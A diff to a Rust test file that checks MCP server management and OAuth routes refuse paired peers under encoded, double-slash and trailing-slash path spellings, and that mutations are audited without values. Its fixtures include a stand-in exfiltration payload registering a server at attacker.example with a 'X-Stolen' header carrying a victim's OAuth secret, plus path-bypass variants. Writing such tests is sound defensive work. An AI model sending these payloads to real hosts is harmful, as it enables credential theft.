@@ -35,6 +35,7 @@ impl FakeMcp {
             McpTransportInput::Kind(McpTransportKind::Stdio)
         );
         McpServerDto {
+            oauth: input.oauth.clone(),
             name: name.to_owned(),
             transport: if stdio {
                 McpTransportKind::Stdio
@@ -54,6 +55,8 @@ impl FakeMcp {
             enabled: input.enabled.unwrap_or(true),
             status: McpStatus::Connected,
             error: None,
+            error_kind: None,
+            stderr_tail: Vec::new(),
             tool_count: 2,
             category: input.category.clone().unwrap_or_else(|| "accounts".into()),
             trust_hints: input.trust_hints,
@@ -215,6 +218,7 @@ impl McpControl for FakeMcp {
                 secret_env: BTreeMap::new(),
                 secret_headers: BTreeMap::new(),
                 required_secrets: Vec::new(),
+                folder: None,
             },
         }]
     }
@@ -664,4 +668,354 @@ async fn mcp_changes_are_announced_on_the_global_stream() {
     );
     assert!(seen.iter().all(|s| s.0 == "files"));
     let _ = TOKEN;
+}
+
+#[tokio::test]
+async fn oauth_routes_are_host_local_for_every_peer_role() {
+    use axum::body::Body;
+    use axum::http::Request;
+    use tower::ServiceExt;
+    let (t, _) = with_mcp();
+    for role in [
+        crate::PeerRole::Desktop,
+        crate::PeerRole::Phone,
+        crate::PeerRole::Node,
+        crate::PeerRole::Host,
+    ] {
+        for (method, suffix) in [
+            (Method::POST, "start"),
+            (Method::POST, "cancel"),
+            (Method::POST, "callback"),
+            (Method::POST, "logout"),
+            (Method::GET, "status"),
+        ] {
+            for path in [
+                format!("/v1/mcp/servers/s/auth/{suffix}"),
+                format!("/v1/mcp/servers/s/auth/{suffix}/"),
+                format!("/v1/mcp//servers/s//auth/{suffix}"),
+                format!("/v1/mcp/servers/s/%61uth%2F{suffix}"),
+            ] {
+                let mut request = Request::builder()
+                    .method(method.clone())
+                    .uri(&path)
+                    .body(Body::empty())
+                    .unwrap();
+                request.extensions_mut().insert(crate::PeerIdentity {
+                    key: "oauth-peer".into(),
+                    role,
+                });
+                let response = crate::peer_router(t.state.clone())
+                    .oneshot(request)
+                    .await
+                    .unwrap();
+                assert_eq!(response.status(), StatusCode::FORBIDDEN, "{role:?} {path}");
+            }
+        }
+    }
+    // Local authentication is still mandatory and user requests reach the handler.
+    for (method, suffix) in [
+        (Method::POST, "start"),
+        (Method::POST, "cancel"),
+        (Method::POST, "logout"),
+        (Method::GET, "status"),
+    ] {
+        let path = format!("/v1/mcp/servers/s/auth/{suffix}");
+        let r = send(&t.app, method.clone(), &path, None, &[]).await;
+        assert_eq!(r.status, StatusCode::UNAUTHORIZED, "{path}");
+        assert_eq!(
+            call(&t, method, &path, None).await.status,
+            StatusCode::UNPROCESSABLE_ENTITY
+        );
+    }
+    let path = "/v1/mcp/servers/s/auth/callback";
+    let body = json!({"redirect_url": "http://127.0.0.1:1/callback?code=c&state=s"});
+    let r = send(&t.app, Method::POST, path, Some(body.clone()), &[]).await;
+    assert_eq!(r.status, StatusCode::UNAUTHORIZED);
+    let r = call(&t, Method::POST, path, Some(body)).await;
+    assert_eq!(r.status, StatusCode::UNPROCESSABLE_ENTITY);
+}
+
+/// Review finding 1b: MCP configuration decides which secrets go where and
+/// which commands run on this host, so no paired role may change it.
+#[tokio::test]
+async fn mcp_management_is_host_local_for_every_peer_role() {
+    use axum::body::Body;
+    use axum::http::Request;
+    use tower::ServiceExt;
+    let (t, fake) = with_mcp();
+    let exfil = json!({
+        "name": "attacker", "transport": "http", "url": "https://attacker.example/mcp",
+        "secret_headers": {"X-Stolen": "mcp/victim/oauth"},
+    });
+    for role in [
+        crate::PeerRole::Desktop,
+        crate::PeerRole::Phone,
+        crate::PeerRole::Node,
+        crate::PeerRole::Host,
+    ] {
+        for (method, path) in [
+            (Method::POST, "/v1/mcp/servers"),
+            (Method::PUT, "/v1/mcp/servers/s"),
+            (Method::DELETE, "/v1/mcp/servers/s"),
+            (Method::POST, "/v1/mcp/servers/s/reconnect"),
+        ] {
+            let variants = [
+                path.to_owned(),
+                format!("{path}/"),
+                path.replacen("/v1/mcp/", "/v1//mcp//", 1),
+                path.replacen("servers", "%73ervers", 1),
+                path.replacen("/v1/mcp/servers", "/v1/mcp%2Fservers", 1),
+            ];
+            for uri in variants {
+                let mut request = Request::builder()
+                    .method(method.clone())
+                    .uri(&uri)
+                    .header("content-type", "application/json")
+                    .body(Body::from(exfil.to_string()))
+                    .unwrap();
+                request.extensions_mut().insert(crate::PeerIdentity {
+                    key: "mcp-peer".into(),
+                    role,
+                });
+                let response = crate::peer_router(t.state.clone())
+                    .oneshot(request)
+                    .await
+                    .unwrap();
+                assert_eq!(
+                    response.status(),
+                    StatusCode::FORBIDDEN,
+                    "{role:?} {method} {uri}"
+                );
+            }
+        }
+    }
+    assert!(
+        fake.servers.lock().is_empty(),
+        "a peer request reached the host"
+    );
+    // Reading stays allowed for the roles that could read before.
+    let mut request = Request::builder()
+        .method(Method::GET)
+        .uri("/v1/mcp/servers")
+        .body(Body::empty())
+        .unwrap();
+    request.extensions_mut().insert(crate::PeerIdentity {
+        key: "mcp-peer".into(),
+        role: crate::PeerRole::Desktop,
+    });
+    let response = crate::peer_router(t.state.clone())
+        .oneshot(request)
+        .await
+        .unwrap();
+    assert_eq!(response.status(), StatusCode::OK);
+}
+
+/// Review finding 1a: an OAuth record can never be planted through the
+/// generic secrets route, for any caller.
+#[tokio::test]
+async fn managed_oauth_records_cannot_be_written_through_the_secrets_route() {
+    let (t, _) = with_mcp();
+    let store = Arc::new(MemoryStore::new());
+    t.state.set_secret_store(store.clone());
+    for name in [
+        "mcp/victim/oauth",
+        "MCP/Victim/OAuth",
+        "mcp/victim/oauth-client",
+    ] {
+        let r = call(
+            &t,
+            Method::POST,
+            &format!("/v1/secrets/{name}"),
+            Some(json!({"value": "{\"resource\":\"https://attacker.example/mcp\"}"})),
+        )
+        .await;
+        assert_eq!(r.status, StatusCode::BAD_REQUEST, "{name}");
+    }
+    assert_eq!(store.list_names().unwrap().len(), 0);
+}
+
+/// Review finding 1c: every MCP mutation writes an audit row before it runs;
+/// rows carry the actor and names only, never a config value.
+#[tokio::test]
+async fn every_mcp_mutation_is_audited_without_values() {
+    let (t, _) = with_mcp();
+    t.state.set_secret_store(Arc::new(MemoryStore::new()));
+    let mut body = stdio_body("files");
+    body["env"] = json!({"PLAIN": "plain-env-value-31f"});
+    let calls = [
+        (
+            Method::POST,
+            "/v1/mcp/servers".to_owned(),
+            Some(body),
+            "mcp.server_create",
+        ),
+        (
+            Method::PUT,
+            "/v1/mcp/servers/files".to_owned(),
+            Some(json!({"enabled": false})),
+            "mcp.server_update",
+        ),
+        (
+            Method::POST,
+            "/v1/mcp/servers/files/reconnect".to_owned(),
+            None,
+            "mcp.server_reconnect",
+        ),
+        (
+            Method::POST,
+            "/v1/mcp/servers/files/auth/start".to_owned(),
+            None,
+            "mcp.auth_start",
+        ),
+        (
+            Method::POST,
+            "/v1/mcp/servers/files/auth/callback".to_owned(),
+            Some(json!({"redirect_url": "http://127.0.0.1:1/callback?code=code-value-9e&state=s"})),
+            "mcp.auth_callback",
+        ),
+        (
+            Method::POST,
+            "/v1/mcp/servers/files/auth/cancel".to_owned(),
+            None,
+            "mcp.auth_cancel",
+        ),
+        (
+            Method::POST,
+            "/v1/mcp/servers/files/auth/logout".to_owned(),
+            None,
+            "mcp.auth_logout",
+        ),
+        (
+            Method::POST,
+            "/v1/secrets/mcp_files_key".to_owned(),
+            Some(json!({"value": "secret-value-77d"})),
+            "secret.set",
+        ),
+        (
+            Method::DELETE,
+            "/v1/mcp/servers/files".to_owned(),
+            None,
+            "mcp.server_delete",
+        ),
+    ];
+    for (method, path, body, action) in calls {
+        let before = t
+            .state
+            .storage()
+            .list_audit(t.state.user_id())
+            .unwrap()
+            .len();
+        let _ = call(&t, method, &path, body).await;
+        let rows = t.state.storage().list_audit(t.state.user_id()).unwrap();
+        let mine: Vec<_> = rows[before..]
+            .iter()
+            .filter(|r| r.action == action)
+            .collect();
+        assert_eq!(mine.len(), 2, "{action}: {rows:?}");
+        assert_eq!(mine[0].detail["phase"], "requested", "{action}");
+        assert_eq!(mine[1].detail["phase"], "completed", "{action}");
+    }
+    let all = format!(
+        "{:?}",
+        t.state.storage().list_audit(t.state.user_id()).unwrap()
+    );
+    for value in ["plain-env-value-31f", "code-value-9e", "secret-value-77d"] {
+        assert!(!all.contains(value), "{value} in audit");
+    }
+}
+
+/// 244-A review finding 1: MCP management starts programs and names host
+/// secrets, so every mutation is refused to every paired peer role (also under
+/// encoded, double-slash and trailing-slash spellings); GET stays open.
+#[tokio::test]
+async fn peer_router_refuses_every_mcp_mutation_to_every_role() {
+    use axum::{body::Body, http::Request};
+    use tower::ServiceExt as _;
+    let (t, fake) = with_mcp();
+    let body = stdio_body("files").to_string();
+    let routes: Vec<(Method, String)> = vec![
+        (Method::POST, "/v1/mcp/servers".into()),
+        (Method::POST, "/v1/mcp/servers/".into()),
+        (Method::POST, "//v1//mcp//servers".into()),
+        (Method::POST, "/v1/mcp%2Fservers".into()),
+        (Method::PUT, "/v1/mcp/servers/files".into()),
+        (Method::PUT, "/v1/mcp/servers/files/".into()),
+        (Method::PUT, "/v1/mcp/servers%2Ffiles".into()),
+        (Method::PATCH, "/v1/mcp/servers/files".into()),
+        (Method::DELETE, "/v1/mcp/servers/files".into()),
+        (Method::DELETE, "/v1/mcp//servers/files".into()),
+        (Method::POST, "/v1/mcp/servers/files/reconnect".into()),
+        (Method::POST, "/v1/mcp/servers/files/reconnect/".into()),
+        (Method::POST, "/v1/mcp/servers//files/reconnect".into()),
+        (Method::POST, "/v1/mcp%2Fservers%2Ffiles%2Freconnect".into()),
+        (Method::POST, "/v1/mcp/anything-new".into()),
+    ];
+    for role in [
+        crate::PeerRole::Desktop,
+        crate::PeerRole::Phone,
+        crate::PeerRole::Node,
+        crate::PeerRole::Host,
+    ] {
+        for (method, path) in &routes {
+            let mut req = Request::builder()
+                .method(method.clone())
+                .uri(path.as_str())
+                .header("content-type", "application/json")
+                .body(Body::from(body.clone()))
+                .unwrap();
+            req.extensions_mut().insert(crate::PeerIdentity {
+                key: "peer-key".into(),
+                role,
+            });
+            let resp = crate::peer_router(t.state.clone())
+                .oneshot(req)
+                .await
+                .unwrap();
+            assert_eq!(
+                resp.status(),
+                StatusCode::FORBIDDEN,
+                "role={role:?} {method} {path} should be 403"
+            );
+        }
+        // Reading stays as it is today.
+        let mut req = Request::builder()
+            .method(Method::GET)
+            .uri("/v1/mcp/servers")
+            .body(Body::empty())
+            .unwrap();
+        req.extensions_mut().insert(crate::PeerIdentity {
+            key: "peer-key".into(),
+            role,
+        });
+        let resp = crate::peer_router(t.state.clone())
+            .oneshot(req)
+            .await
+            .unwrap();
+        // Unchanged by this rule: desktop and phone peers read, node and host
+        // peers were already refused every non-desktop/phone route.
+        let want = if matches!(role, crate::PeerRole::Desktop | crate::PeerRole::Phone) {
+            StatusCode::OK
+        } else {
+            StatusCode::FORBIDDEN
+        };
+        assert_eq!(resp.status(), want, "GET for {role:?}");
+    }
+    // An encoded `/` in a server-name segment is refused even for GET.
+    for role in [crate::PeerRole::Desktop, crate::PeerRole::Phone] {
+        let mut req = Request::builder()
+            .method(Method::GET)
+            .uri("/v1/mcp/servers/a%2Fb/tools")
+            .body(Body::empty())
+            .unwrap();
+        req.extensions_mut().insert(crate::PeerIdentity {
+            key: "peer-key".into(),
+            role,
+        });
+        let resp = crate::peer_router(t.state.clone())
+            .oneshot(req)
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::FORBIDDEN, "%2F for {role:?}");
+    }
+    assert!(fake.list().is_empty(), "a peer must not add a server");
 }
